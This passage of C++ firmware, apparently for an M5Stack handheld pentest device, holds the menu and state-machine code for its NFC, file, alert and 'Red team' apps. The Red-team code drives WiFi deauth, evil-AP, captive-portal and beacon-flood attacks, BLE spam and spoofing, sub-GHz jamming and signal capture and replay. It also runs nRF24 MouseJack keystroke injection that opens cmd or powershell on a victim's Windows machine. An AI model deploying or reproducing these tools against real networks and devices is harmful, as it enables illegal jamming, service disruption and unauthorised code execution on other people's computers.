          drawNfcScreen(mode); return true;
        }
      }
      if (now - g_nfcLastScanAttemptMs < static_cast<uint32_t>(kNfcTimeoutValues[g_cfgNfcTimeout])) {
        drawNfcScreen(mode); return true;
      }
      g_nfcLastScanAttemptMs = now;
      ++g_nfcScanCount;
      NfcTag found = {};
      if (nfcScanTag(found, 180)) {
        g_nfcLastTag = found;
        g_nfcView = NfcView::TagDetail;
        g_nfcMsg[0] = '\0';
      } else {
        snprintf(g_nfcMsg, sizeof(g_nfcMsg), "No tag... hold closer");
      }
      drawNfcScreen(mode); return true;
    }
    if (g_nfcView == NfcView::TagDetail) {
      if (selectPressed) {  // save
        if (nfcSaveToSd(g_nfcLastTag)) {
          nfcScanSdFiles();
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Saved (%d tags)", g_nfcSdFileCount);
        } else {
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Save fail: %s", g_nfcLastError);
        }
        drawNfcScreen(mode); return true;
      }
      if (rescanPressed) {
        g_nfcView = NfcView::Scanning;
        g_nfcScanCount = 0;
        g_nfcLastScanAttemptMs = 0;
        g_nfcReaderReady = nfcInit();
        g_nfcMsg[0] = '\0';
        drawNfcScreen(mode); return true;
      }
      if (backPressed) {
        g_nfcView = NfcView::Menu; g_nfcMsg[0] = '\0';
        drawNfcScreen(mode); return true;
      }
      return true;
    }
    if (g_nfcView == NfcView::SavedList) {
      if (moveUp && g_nfcSdFileSel > 0) {
        --g_nfcSdFileSel;
        if (g_nfcSdFileSel < g_nfcSdFileScroll) g_nfcSdFileScroll = g_nfcSdFileSel;
        drawNfcScreen(mode); return true;
      }
      if (moveDown && g_nfcSdFileSel < g_nfcSdFileCount - 1) {
        ++g_nfcSdFileSel;
        if (g_nfcSdFileSel >= g_nfcSdFileScroll + 5) g_nfcSdFileScroll = g_nfcSdFileSel - 4;
        drawNfcScreen(mode); return true;
      }
      if (selectPressed && g_nfcSdFileCount > 0) {
        NfcTag tmp = {};
        if (nfcLoadFromSd(g_nfcSdFiles[g_nfcSdFileSel], tmp)) {
          g_nfcLastTag = tmp;
          g_nfcView = NfcView::Emulating;
          g_nfcMsg[0] = '\0';
        } else {
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Load failed");
        }
        drawNfcScreen(mode); return true;
      }
      if (deletePressed && g_nfcSdFileCount > 0) {
        SD.remove(g_nfcSdFiles[g_nfcSdFileSel]);
        nfcScanSdFiles();
        if (g_nfcSdFileSel >= g_nfcSdFileCount) g_nfcSdFileSel = g_nfcSdFileCount > 0 ? g_nfcSdFileCount - 1 : 0;
        if (g_nfcSdFileSel < g_nfcSdFileScroll) g_nfcSdFileScroll = g_nfcSdFileSel;
        snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Deleted. %d tags left", g_nfcSdFileCount);
        drawNfcScreen(mode); return true;
      }
      if (renamePressed && g_nfcSdFileCount > 0) {
        renameBegin(g_nfcSdFiles[g_nfcSdFileSel], "/nfc", ".nfc");
        g_nfcView = NfcView::Rename;
        drawNfcScreen(mode); return true;
      }
      if (rescanPressed) {
        nfcScanSdFiles();
        g_nfcSdFileSel = 0;
        g_nfcSdFileScroll = 0;
        snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Found %d tags", g_nfcSdFileCount);
        drawNfcScreen(mode); return true;
      }
      if (backPressed) {
        g_nfcView = NfcView::Menu; g_nfcMsg[0] = '\0';
        drawNfcScreen(mode); return true;
      }
      return true;
    }
    if (g_nfcView == NfcView::Rename) {
      if (g_appTypedChar) { renameHandleChar(); drawNfcScreen(mode); return true; }
      if (g_appTypedBackspace && g_renameLen > 0) {
        g_renameBuffer[--g_renameLen] = '\0';
        drawNfcScreen(mode); return true;
      }
      if (backPressed) {
        g_nfcView = NfcView::SavedList; g_nfcMsg[0] = '\0';
        drawNfcScreen(mode); return true;
      }
      if (selectPressed && g_renameLen > 0) {
        if (renameCommit()) {
          nfcScanSdFiles();
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Renamed OK");
        } else {
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Rename failed");
        }
        g_nfcView = NfcView::SavedList;
        drawNfcScreen(mode); return true;
      }
      return true;
    }
    if (g_nfcView == NfcView::Emulating) {
      if (backPressed) {
        nfcDeinit();  // clears g_tgInitPending so next emulation starts fresh
        g_nfcView = NfcView::Menu; g_nfcMsg[0] = '\0';
        drawNfcScreen(mode); return true;
      }
      // Periodic refresh drives emulation
      if (!moveUp && !moveDown && !selectPressed && !cycleSort && !rescanPressed) {
        const bool found = nfcEmulateTag(g_nfcLastTag, 800);
        if (found) {
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Tag read!");
        } else if (nfcIsEmulating()) {
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Hold near reader...");
        } else {
          snprintf(g_nfcMsg, sizeof(g_nfcMsg), "Init failed, retrying");
        }
        drawNfcScreen(mode); return true;
      }
      return true;
    }
  }
    if (mode == TeamMode::Blue && appId == AppId::Alerts) {
      if (backPressed && g_alertDetail) {
      g_alertDetail = false;
      drawAlertsScreen(mode);
      return true;
    }
    if (moveUp && !g_alertDetail && g_alertCount > 0) {
      if (g_alertSelected > 0) --g_alertSelected;
      if (g_alertSelected < g_alertScroll) g_alertScroll = g_alertSelected;
      drawAlertsScreen(mode);
      return true;
    }
    if (moveDown && !g_alertDetail && g_alertCount > 0) {
      if (g_alertSelected < g_alertCount - 1) ++g_alertSelected;
      if (g_alertSelected >= g_alertScroll + kBleVisibleRows) {
        g_alertScroll = g_alertSelected - kBleVisibleRows + 1;
      }
      drawAlertsScreen(mode);
      return true;
    }
    if (rescanPressed && !g_alertDetail) {
      buildAlertFeed();
      drawAlertsScreen(mode);
      return true;
    }
    if (selectPressed) {
      if (g_alertDetail) {
        g_alertDetail = false;
      } else if (g_alertCount > 0) {
        g_alertDetail = true;
      }
      drawAlertsScreen(mode);
        return true;
      }
    }
    if (appId == AppId::Files) {
      if (g_filesView == FilesView::RootMenu) {
        if (backPressed) {
          return false;
        }
        if (moveUp && g_filesMenuIndex > 0) { --g_filesMenuIndex; drawFilesScreen(mode); return true; }
        if (moveDown && g_filesMenuIndex < 1) { ++g_filesMenuIndex; drawFilesScreen(mode); return true; }
        if (selectPressed) {
          g_filesTarget = g_filesMenuIndex == 0 ? StorageTarget::Internal : StorageTarget::Sd;
          scanBrowserEntries(g_filesTarget, "/");
          g_filesView = FilesView::Browser;
          drawFilesScreen(mode);
          return true;
        }
        return true;
      }
      if (g_filesView == FilesView::Browser) {
        if (moveUp && g_filesSelected > 0) { --g_filesSelected; trimBrowserScroll(); drawFilesScreen(mode); return true; }
        if (moveDown && g_filesSelected < g_browserCount - 1) { ++g_filesSelected; trimBrowserScroll(); drawFilesScreen(mode); return true; }
        if (deletePressed && g_browserCount > 0 && g_browserEntries[g_filesSelected].path != "..") {
          g_filesDeletePath = g_browserEntries[g_filesSelected].path;
          g_filesView = FilesView::ConfirmDelete;
          drawFilesScreen(mode);
          return true;
        }
        if (selectPressed && g_browserCount > 0) {
          const FileBrowserEntry& entry = g_browserEntries[g_filesSelected];
          if (entry.path == "..") {
            String parent = g_filesCurrentPath;
            int slash = parent.lastIndexOf('/');
            if (slash <= 0) parent = "/";
            else parent = parent.substring(0, slash);
            scanBrowserEntries(g_filesTarget, parent);
          } else if (entry.isDir) {
            scanBrowserEntries(g_filesTarget, entry.path);
          }
          drawFilesScreen(mode);
          return true;
        }
        if (backPressed) {
          if (g_filesCurrentPath != "/") {
            String parent = g_filesCurrentPath;
            int slash = parent.lastIndexOf('/');
            if (slash <= 0) parent = "/";
            else parent = parent.substring(0, slash);
            scanBrowserEntries(g_filesTarget, parent);
            drawFilesScreen(mode);
            return true;
          }
          g_filesView = FilesView::RootMenu;
          drawFilesScreen(mode);
          return true;
        }
        return true;
      }
      if (g_filesView == FilesView::ConfirmDelete) {
        if (backPressed) {
          g_filesView = FilesView::Browser;
          drawFilesScreen(mode);
          return true;
        }
        if (selectPressed) {
          deleteBrowserPath(g_filesTarget, g_filesDeletePath);
          scanBrowserEntries(g_filesTarget, g_filesCurrentPath);
          g_filesView = FilesView::Browser;
          drawFilesScreen(mode);
          return true;
        }
        return true;
      }
    }
    if (mode == TeamMode::Blue && appId == AppId::DeviceHealth) {
      if (rescanPressed || selectPressed) {
        drawDeviceHealthScreen(mode);
        return true;
      }
      return false;
    }
  if (mode == TeamMode::Red && appId == AppId::WifiOps) {
    // --- Attacking ---
    if (g_redWifiState == WifiOpsState::Attacking) {
      tickRedWifiAttack();
      drawWifiAttackScreen(mode);
      if (backPressed) {
        stopRedWifiAttack();
        g_redWifiState = WifiOpsState::MainMenu;
        drawWifiOpsScreen(mode);
      }
      return true;
    }
    // --- Main menu ---
    if (g_redWifiState == WifiOpsState::MainMenu) {
      if (backPressed) return false;
      if (moveUp) {
        if (g_redWifiTopMenuSel > 0) --g_redWifiTopMenuSel;
        drawWifiMainMenuScreen(mode);
        return true;
      }
      if (moveDown) {
        if (g_redWifiTopMenuSel < 4) ++g_redWifiTopMenuSel;
        drawWifiMainMenuScreen(mode);
        return true;
      }
      if (selectPressed) {
        switch (g_redWifiTopMenuSel) {
          case 0: {
            // Scan Targets — show scan splash, run scan, go to list
            M5.Display.fillScreen(themeModeBg(mode));
            M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
            M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
            M5.Display.setTextColor(kGold, themeModePanel(mode));
            M5.Display.setTextSize(1);
            M5.Display.setCursor(8, 8);
            M5.Display.println("Red Team WiFi Ops");
            M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
            M5.Display.drawRoundRect(8, 28, 224, 92, 3, themeModeAccent(mode));
            M5.Display.setTextColor(kGold, kPanelAlt);
            M5.Display.setCursor(14, 60);
            M5.Display.println("Scanning...");
            M5.Display.display();
            runWifiScan();
            g_redWifiSelected = 0;
            g_redWifiScroll = 0;
            g_redWifiState = WifiOpsState::List;
            drawWifiOpsScreen(mode);
            break;
          }
          case 1: startRedWifiAttack(WifiAttackType::EvilAP);       break;
          case 2: startRedWifiAttack(WifiAttackType::CaptivePortal); break;
          case 3: startRedWifiAttack(WifiAttackType::BeaconFlood);   break;
          case 4: startRedWifiAttack(WifiAttackType::DeauthSweep);   break;
        }
        drawWifiOpsScreen(mode);
        return true;
      }
      return true;
    }
    // --- Action menu (per-target) ---
    if (g_redWifiState == WifiOpsState::ActionMenu) {
      if (backPressed) {
        g_redWifiState = WifiOpsState::List;
        drawWifiOpsScreen(mode);
        return true;
      }
      if (moveUp) {
        if (g_redWifiMenuSel > 0) --g_redWifiMenuSel;
        drawWifiActionMenuScreen(mode);
        return true;
      }
      if (moveDown) {
        if (g_redWifiMenuSel < 4) ++g_redWifiMenuSel;
        drawWifiActionMenuScreen(mode);
        return true;
      }
      if (selectPressed) {
        switch (g_redWifiMenuSel) {
          case 0: startRedWifiAttack(WifiAttackType::Deauth);        break;
          case 1: startRedWifiAttack(WifiAttackType::EvilAP);        break;
          case 2: startRedWifiAttack(WifiAttackType::CaptivePortal); break;
          case 3: startRedWifiAttack(WifiAttackType::BeaconFlood);   break;
          case 4: g_redWifiState = WifiOpsState::Detail;             break;
        }
        drawWifiOpsScreen(mode);
        return true;
      }
      return true;
    }
    // --- Detail view ---
    if (g_redWifiState == WifiOpsState::Detail) {
      if (backPressed || selectPressed) {
        g_redWifiState = WifiOpsState::List;
        drawWifiOpsScreen(mode);
        return true;
      }
      return true;
    }
    // --- Target list (after scan) ---
    if (backPressed) {
      g_redWifiState = WifiOpsState::MainMenu;
      drawWifiOpsScreen(mode);
      return true;
    }
    if (moveUp && g_wifiCount > 0) {
      if (g_redWifiSelected > 0) --g_redWifiSelected;
      if (g_redWifiSelected < g_redWifiScroll) g_redWifiScroll = g_redWifiSelected;
      drawWifiOpsScreen(mode);
      return true;
    }
    if (moveDown && g_wifiCount > 0) {
      if (g_redWifiSelected < g_wifiCount - 1) ++g_redWifiSelected;
      if (g_redWifiSelected >= g_redWifiScroll + kWifiVisibleRows) {
        g_redWifiScroll = g_redWifiSelected - kWifiVisibleRows + 1;
      }
      drawWifiOpsScreen(mode);
      return true;
    }
    if (cycleSort) {
      switch (g_wifiSortMode) {
        case WifiSortMode::Rssi:      g_wifiSortMode = WifiSortMode::OpenFirst; break;
        case WifiSortMode::OpenFirst: g_wifiSortMode = WifiSortMode::Channel;   break;
        case WifiSortMode::Channel:   g_wifiSortMode = WifiSortMode::NewFirst;  break;
        case WifiSortMode::NewFirst:  g_wifiSortMode = WifiSortMode::Threat;    break;
        case WifiSortMode::Threat:    g_wifiSortMode = WifiSortMode::Rssi;      break;
      }
      sortWifiItems();
      g_redWifiSelected = 0;
      g_redWifiScroll = 0;
      drawWifiOpsScreen(mode);
      return true;
    }
    if (rescanPressed) {
      runWifiScan();
      g_redWifiSelected = 0;
      g_redWifiScroll = 0;
      drawWifiOpsScreen(mode);
      return true;
    }
    if (selectPressed && g_wifiCount > 0) {
      g_redWifiState = WifiOpsState::ActionMenu;
      g_redWifiMenuSel = 0;
      drawWifiActionMenuScreen(mode);
      return true;
    }
  }
  if (mode == TeamMode::Red && appId == AppId::BleOps) {
    // --- Attacking ---
    if (g_redBleState == BleOpsState::Attacking) {
      tickBleAttack();
      drawBleAttackScreen(mode);
      if (backPressed) {
        stopBleAttack();
        g_redBleState = BleOpsState::MainMenu;
        drawBleOpsScreen(mode);
      }
      return true;
    }
    // --- Main menu ---
    if (g_redBleState == BleOpsState::MainMenu) {
      if (backPressed) return false;
      if (moveUp) {
        if (g_redBleTopMenuSel > 0) --g_redBleTopMenuSel;
        drawBleMainMenuScreen(mode);
        return true;
      }
      if (moveDown) {
        if (g_redBleTopMenuSel < 4) ++g_redBleTopMenuSel;
        drawBleMainMenuScreen(mode);
        return true;
      }
      if (selectPressed) {
        switch (g_redBleTopMenuSel) {
          case 0: {
            // Scan & Target
            M5.Display.fillScreen(themeModeBg(mode));
            M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
            M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
            M5.Display.setTextColor(kGold, themeModePanel(mode));
            M5.Display.setTextSize(1);
            M5.Display.setCursor(8, 8);
            M5.Display.println("Red Team BLE Ops");
            M5.Display.fillRoundRect(8, 28, 224, 92, 3, kPanelAlt);
            M5.Display.drawRoundRect(8, 28, 224, 92, 3, themeModeAccent(mode));
            M5.Display.setTextColor(kGold, kPanelAlt);
            M5.Display.setCursor(14, 60);
            M5.Display.println("Scanning BLE...");
            M5.Display.display();
            runBleScan();
            g_redBleSelected = 0;
            g_redBleScroll = 0;
            g_redBleState = BleOpsState::List;
            drawBleOpsScreen(mode);
            break;
          }
          case 1: startBleAttack(BleAttackType::AppleSpam);   break;
          case 2: startBleAttack(BleAttackType::AndroidSpam); break;
          case 3: startBleAttack(BleAttackType::BleFlood);    break;
          case 4: startBleAttack(BleAttackType::DeviceSpoof); break;
        }
        drawBleOpsScreen(mode);
        return true;
      }
      return true;
    }
    // --- Action menu (per-target) ---
    if (g_redBleState == BleOpsState::ActionMenu) {
      if (backPressed) {
        g_redBleState = BleOpsState::List;
        drawBleOpsScreen(mode);
        return true;
      }
      if (moveUp) {
        if (g_redBleMenuSel > 0) --g_redBleMenuSel;
        drawBleActionMenuScreen(mode);
        return true;
      }
      if (moveDown) {
        if (g_redBleMenuSel < 2) ++g_redBleMenuSel;
        drawBleActionMenuScreen(mode);
        return true;
      }
      if (selectPressed) {
        switch (g_redBleMenuSel) {
          case 0: startBleAttack(BleAttackType::CloneSpam); break;
          case 1: startBleAttack(BleAttackType::BleFlood);  break;
          case 2: g_redBleState = BleOpsState::Detail;      break;
        }
        drawBleOpsScreen(mode);
        return true;
      }
      return true;
    }
    // --- Detail view ---
    if (g_redBleState == BleOpsState::Detail) {
      if (backPressed || selectPressed) {
        g_redBleState = BleOpsState::List;
        drawBleOpsScreen(mode);
        return true;
      }
      return true;
    }
    // --- Target list ---
    if (backPressed) {
      g_redBleState = BleOpsState::MainMenu;
      drawBleOpsScreen(mode);
      return true;
    }
    if (moveUp && g_bleCount > 0) {
      if (g_redBleSelected > 0) --g_redBleSelected;
      if (g_redBleSelected < g_redBleScroll) g_redBleScroll = g_redBleSelected;
      drawBleOpsScreen(mode);
      return true;
    }
    if (moveDown && g_bleCount > 0) {
      if (g_redBleSelected < g_bleCount - 1) ++g_redBleSelected;
      if (g_redBleSelected >= g_redBleScroll + kBleVisibleRows) {
        g_redBleScroll = g_redBleSelected - kBleVisibleRows + 1;
      }
      drawBleOpsScreen(mode);
      return true;
    }
    if (cycleSort) {
      switch (g_bleSortMode) {
        case BleSortMode::Rssi:     g_bleSortMode = BleSortMode::NewFirst; break;
        case BleSortMode::NewFirst: g_bleSortMode = BleSortMode::Threat;   break;
        case BleSortMode::Threat:   g_bleSortMode = BleSortMode::Rssi;     break;
      }
      sortBleItems();
      g_redBleSelected = 0;
      g_redBleScroll = 0;
      drawBleOpsScreen(mode);
      return true;
    }
    if (rescanPressed) {
      runBleScan();
      g_redBleSelected = 0;
      g_redBleScroll = 0;
      drawBleOpsScreen(mode);
      return true;
    }
    if (selectPressed && g_bleCount > 0) {
      g_redBleState = BleOpsState::ActionMenu;
      g_redBleMenuSel = 0;
      drawBleActionMenuScreen(mode);
      return true;
    }
  }

  // ─── CC1101 Ops (Red team) ───
  if (mode == TeamMode::Red && appId == AppId::Cc1101Ops) {
    if (g_redCc1101State == Cc1101OpsState::Monitoring) {
      if (backPressed) {
        g_redCc1101State = Cc1101OpsState::Menu;
        g_redCc1101JamCount = 0;
        drawCc1101OpsScreen(mode);
        return true;
      }
      if (cycleSort) {
        g_redCc1101BandIndex = (g_redCc1101BandIndex + 1) % 4;
        drawCc1101MonitorScreen(mode);
        return true;
      }
      if (selectPressed) {
        // Enter capture mode from monitor
        g_redCc1101State = Cc1101OpsState::Capturing;
        g_redCc1101ReplayCount = 0;
        g_redCc1101StartMs = millis();
        drawCc1101OpsScreen(mode);
        return true;
      }
      tickCc1101Monitor();
      drawCc1101MonitorScreen(mode);
      return true;
    }
    if (g_redCc1101State == Cc1101OpsState::Jamming) {
      tickCc1101Jam();
      drawCc1101JamScreen(mode);
      if (backPressed) {
        hardwareCc1101StopJam();
        g_redCc1101State = Cc1101OpsState::Menu;
        drawCc1101OpsScreen(mode);
      }
      return true;
    }
    if (g_redCc1101State == Cc1101OpsState::Capturing) {
      if (backPressed) {
        g_redCc1101State = Cc1101OpsState::Menu;
        drawCc1101OpsScreen(mode);
        return true;
      }
      if (selectPressed) {
        if (g_redCc1101HasCapture) {
          hardwareCc1101Replay(g_redCc1101Capture, atoi(g_cc1101Bands[g_redCc1101BandIndex]));
          ++g_redCc1101ReplayCount;
        } else {
          ++g_redCc1101ReplayCount;
          g_redCc1101HasCapture = hardwareCc1101TryCapturePacket(
            atoi(g_cc1101Bands[g_redCc1101BandIndex]), g_redCc1101Capture);
        }
        drawCc1101OpsScreen(mode);
        return true;
      }
      if (cycleSort || rescanPressed) {
        g_redCc1101HasCapture = false;
        g_redCc1101HasCapture = hardwareCc1101TryCapturePacket(
          atoi(g_cc1101Bands[g_redCc1101BandIndex]), g_redCc1101Capture);
        g_redCc1101ReplayCount = 0;
        drawCc1101OpsScreen(mode);
        return true;
      }
      g_redCc1101MonProbe = hardwareProbeCc1101();
      drawCc1101OpsScreen(mode);
      return true;
    }
    if (g_redCc1101State == Cc1101OpsState::SdReplay) {
      if (deletePressed && g_cc1101SdFileCount > 0) {
        SD.remove(g_cc1101SdFiles[g_cc1101SdFileSel]);
        cc1101ScanSdFiles();
        if (g_cc1101SdFileSel >= g_cc1101SdFileCount) {
          g_cc1101SdFileSel = g_cc1101SdFileCount > 0 ? g_cc1101SdFileCount - 1 : 0;
        }
        snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Deleted. %d files left", g_cc1101SdFileCount);
        drawCc1101SdReplayScreen(mode);
        return true;
      }
      if (backPressed) {
        g_redCc1101State = Cc1101OpsState::Menu;
        g_cc1101SdMsg[0] = '\0';
        drawCc1101OpsScreen(mode);
        return true;
      }
      if (renamePressed && g_cc1101SdFileCount > 0) {
        renameBegin(g_cc1101SdFiles[g_cc1101SdFileSel], "/cc1101", ".bin");
        g_redCc1101State = Cc1101OpsState::Renaming;
        drawCc1101OpsScreen(mode); return true;
      }
      if (rescanPressed) {
        cc1101ScanSdFiles();
        g_cc1101SdFileSel = 0;
        snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Found %d files", g_cc1101SdFileCount);
        drawCc1101SdReplayScreen(mode);
        return true;
      }
      if (moveUp && g_cc1101SdFileSel > 0) {
        --g_cc1101SdFileSel;
        drawCc1101SdReplayScreen(mode);
        return true;
      }
      if (moveDown && g_cc1101SdFileSel < g_cc1101SdFileCount - 1) {
        ++g_cc1101SdFileSel;
        drawCc1101SdReplayScreen(mode);
        return true;
      }
      if (selectPressed && g_cc1101SdFileCount > 0) {
        Cc1101RxCapture tmp = {};
        if (cc1101LoadFromSd(g_cc1101SdFiles[g_cc1101SdFileSel], tmp)) {
          hardwareCc1101Replay(tmp, atoi(g_cc1101Bands[g_redCc1101BandIndex]));
          ++g_redCc1101ReplayCount;
          const char* nm = strrchr(g_cc1101SdFiles[g_cc1101SdFileSel], '/');
          nm = nm ? nm + 1 : g_cc1101SdFiles[g_cc1101SdFileSel];
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "TX'd %.36s", nm);
        } else {
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Load failed");
        }
        drawCc1101SdReplayScreen(mode);
        return true;
      }
      return true;
    }
    if (g_redCc1101State == Cc1101OpsState::Renaming) {
      if (g_appTypedChar) { renameHandleChar(); drawCc1101OpsScreen(mode); return true; }
      if (g_appTypedBackspace && g_renameLen > 0) {
        g_renameBuffer[--g_renameLen] = '\0';
        drawCc1101OpsScreen(mode); return true;
      }
      if (backPressed) {
        g_redCc1101State = Cc1101OpsState::SdReplay; g_cc1101SdMsg[0] = '\0';
        drawCc1101OpsScreen(mode); return true;
      }
      if (selectPressed && g_renameLen > 0) {
        if (renameCommit()) {
          cc1101ScanSdFiles();
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Renamed OK");
        } else {
          snprintf(g_cc1101SdMsg, sizeof(g_cc1101SdMsg), "Rename failed");
        }
        g_redCc1101State = Cc1101OpsState::SdReplay;
        drawCc1101OpsScreen(mode); return true;
      }
      return true;
    }
    // Menu state
    if (backPressed) return false;
    if (moveUp) {
      if (g_redCc1101MenuSel > 0) --g_redCc1101MenuSel;
      drawCc1101OpsMenuScreen(mode);
      return true;
    }
    if (moveDown) {
      if (g_redCc1101MenuSel < 4) ++g_redCc1101MenuSel;
      drawCc1101OpsMenuScreen(mode);
      return true;
    }
    if (cycleSort) {
      g_redCc1101BandIndex = (g_redCc1101BandIndex + 1) % 4;
      drawCc1101OpsMenuScreen(mode);
      return true;
    }
    if (selectPressed) {
      switch (g_redCc1101MenuSel) {
        case 0:  // RX Monitor
          g_redCc1101State = Cc1101OpsState::Monitoring;
          g_redCc1101JamCount = 0;
          g_redCc1101StartMs = millis();
          g_redCc1101MonProbe = hardwarePollCc1101(atoi(g_cc1101Bands[g_redCc1101BandIndex]), g_cc1101Sensitivity);
          drawCc1101OpsScreen(mode);
          break;
        case 1:  // CW Jam
          g_redCc1101State = Cc1101OpsState::Jamming;
          g_redCc1101SweepMode = false;
          g_redCc1101JamCount = 0;
          g_redCc1101StartMs = millis();
          hardwareCc1101StartCwJam(atoi(g_cc1101Bands[g_redCc1101BandIndex]));
          drawCc1101OpsScreen(mode);
          break;
        case 2:  // Sweep Jam
          g_redCc1101State = Cc1101OpsState::Jamming;
          g_redCc1101SweepMode = true;
          g_redCc1101SweepBandIdx = 0;
          g_redCc1101JamCount = 0;
          g_redCc1101StartMs = millis();
          hardwareCc1101StartCwJam(atoi(g_cc1101Bands[0]));
          drawCc1101OpsScreen(mode);
          break;
        case 3:  // Capture Pkt
          g_redCc1101State = Cc1101OpsState::Capturing;
          g_redCc1101HasCapture = false;
          g_redCc1101ReplayCount = 0;
          g_redCc1101StartMs = millis();
          g_cc1101SdMsg[0] = '\0';
          drawCc1101OpsScreen(mode);
          break;
        case 4:  // SD Replay
          cc1101ScanSdFiles();
          g_cc1101SdFileSel = 0;
          g_cc1101SdMsg[0] = '\0';
          g_redCc1101State = Cc1101OpsState::SdReplay;
          drawCc1101OpsScreen(mode);
          break;
      }
      return true;
    }
    return true;
  }

  // ─── nRF24 Ops (Red team) ───
  if (mode == TeamMode::Red && appId == AppId::Nrf24Ops) {
    if (g_redNrfOpsState == Nrf24OpsState::Jamming) {
      tickNrf24Jam();
      drawNrf24JamScreen(mode);
      if (backPressed) {
        hardwareNrf24StopJam();
        g_redNrfOpsState = Nrf24OpsState::Menu;
        drawNrf24OpsScreen(mode);
      }
      return true;
    }
    if (g_redNrfOpsState == Nrf24OpsState::Scanning) {
      if (backPressed) {
        g_redNrfOpsState = Nrf24OpsState::Menu;
        drawNrf24OpsScreen(mode);
        return true;
      }
      if (selectPressed || rescanPressed) {
        // Rescan
        M5.Display.fillRoundRect(8, 26, 224, 78, 3, kPanelAlt);
        M5.Display.setTextColor(kGold, kPanelAlt);
        M5.Display.setCursor(14, 50);
        M5.Display.println("Rescanning channels...");
        M5.Display.display();
        hardwareNrf24FullSweepScan(g_redNrfScanMap);
        g_redNrfScanned = true;
        drawNrf24ScanScreen(mode);
        return true;
      }
      if (moveUp) {
        if (g_redNrfOpsChannel > 0) --g_redNrfOpsChannel;
        drawNrf24ScanScreen(mode);
        return true;
      }
      if (moveDown) {
        if (g_redNrfOpsChannel < 125) ++g_redNrfOpsChannel;
        drawNrf24ScanScreen(mode);
        return true;
      }
      return true;
    }
    if (g_redNrfOpsState == Nrf24OpsState::MouseJack) {
      if (backPressed) {
        g_redNrfOpsState = Nrf24OpsState::Menu;
        drawNrf24OpsScreen(mode);
        return true;
      }
      if (g_mjPhase == MouseJackPhase::Scanning) {
        // Active scan - show scanning, then result
        M5.Display.fillRoundRect(8, 26, 224, 96, 3, kPanelAlt);
        M5.Display.setTextColor(kGold, kPanelAlt);
        M5.Display.setCursor(14, 50);
        M5.Display.println("Scanning ESB (2-83)...");
        M5.Display.display();
        g_mjTarget = hardwareNrf24ScanEsb(2, 83, 2);
        g_mjPhase = g_mjTarget.found ? MouseJackPhase::Found : MouseJackPhase::Scanning;
        drawMouseJackScreen(mode);
        return true;
      }
      if (g_mjPhase == MouseJackPhase::Found) {
        if (rescanPressed) {
          g_mjPhase = MouseJackPhase::Scanning;
          drawMouseJackScreen(mode);
          return true;
        }
        if (selectPressed) {
          g_mjPhase = MouseJackPhase::SelectPayload;
          g_mjPayloadSel = 0;
          drawMouseJackScreen(mode);
          return true;
        }
        return true;
      }
      if (g_mjPhase == MouseJackPhase::SelectPayload) {
        if (moveUp   && g_mjPayloadSel > 0) { --g_mjPayloadSel; drawMouseJackScreen(mode); return true; }
        if (moveDown && g_mjPayloadSel < 4) { ++g_mjPayloadSel; drawMouseJackScreen(mode); return true; }
        if (selectPressed) {
          g_mjPhase = MouseJackPhase::Injecting;
          drawMouseJackScreen(mode);
          M5.Display.display();
          // Inject the selected payload
          static const char* kMjTexts[] = {
            "\x08r",    // Win+R (modifier 0x08, key 'r')
            "\x08r",    // Win+R for powershell too
            "",          // Win+L - just modifier combo
            "\x08r",
            "",          // Ctrl+Shift+Esc
          };
          switch (g_mjPayloadSel) {
            case 0: {  // Win+R > cmd
              const uint8_t winR[] = {0x15};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x08, winR, 1);
              delay(600);
              mjInjectText("cmd");
              const uint8_t enter[] = {0x28};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x00, enter, 1);
              break;
            }
            case 1: {  // Win+R > powershell
              const uint8_t winR[] = {0x15};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x08, winR, 1);
              delay(600);
              mjInjectText("powershell");
              const uint8_t enter[] = {0x28};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x00, enter, 1);
              break;
            }
            case 2: {  // Win+L
              const uint8_t l[] = {0x0F};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x08, l, 1);
              break;
            }
            case 3: {  // Notepad
              const uint8_t winR[] = {0x15};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x08, winR, 1);
              delay(600);
              mjInjectText("notepad");
              const uint8_t enter[] = {0x28};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x00, enter, 1);
              break;
            }
            case 4: {  // Task Manager: Ctrl+Shift+Esc
              const uint8_t esc[] = {0x29};
              hardwareNrf24MouseJackInject(g_mjTarget, 0x01 | 0x02, esc, 1);
              break;
            }
          }
          ++g_mjInjectCount;
          g_mjPhase = MouseJackPhase::Done;
          drawMouseJackScreen(mode);
          return true;
        }
        return true;
      }
      if (g_mjPhase == MouseJackPhase::Done || g_mjPhase == MouseJackPhase::Injecting) {
        if (rescanPressed) {
          g_mjPhase = MouseJackPhase::Scanning;
          g_mjInjectCount = 0;
          drawMouseJackScreen(mode);
          return true;
        }
        if (selectPressed) {
          // inject again - go back to payload select
          g_mjPhase = MouseJackPhase::SelectPayload;
          drawMouseJackScreen(mode);
          return true;
        }
        return true;
      }
      return true;
    }
    // Menu state
    if (backPressed) return false;
    if (moveUp) {
      if (g_redNrfOpsMenuSel > 0) --g_redNrfOpsMenuSel;
      drawNrf24OpsMenuScreen(mode);
      return true;
    }
    if (moveDown) {
      if (g_redNrfOpsMenuSel < 4) ++g_redNrfOpsMenuSel;
